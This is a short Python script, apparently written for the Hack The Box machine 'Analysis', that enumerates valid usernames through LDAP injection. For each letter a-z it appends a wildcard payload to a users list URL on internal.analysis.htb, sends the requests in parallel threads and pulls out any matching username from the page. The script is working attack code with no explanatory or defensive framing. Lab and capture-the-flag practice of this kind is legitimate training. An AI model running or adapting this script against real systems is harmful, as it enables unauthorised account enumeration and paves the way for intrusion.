import requests
import re
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

def ldap_injection(character):
    global main_url
    try:
        response = requests.get(f"{main_url}{character}*")
        if response.status_code == 200:
            if "CONTACT_" not in response.text:
                username = re.findall(r'<strong>(.*?)</strong>', response.text)[0]
                print(colored(f"[+] Valid user: {colored(username, 'blue')}", 'yellow'))
            else:
                print(colored(f"[-] Invalid or no user for: {character}", 'red'))
    except Exception as e:
        print(colored(f"Error with {character}: {str(e)}", 'red'))

def main():
    global main_url
    characters = "abcdefghijklmnopqrstuvwxyz"
    main_url = "http://internal.analysis.htb/users/list.php?name="

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(ldap_injection, characters)

if __name__ == "__main__":
    main()
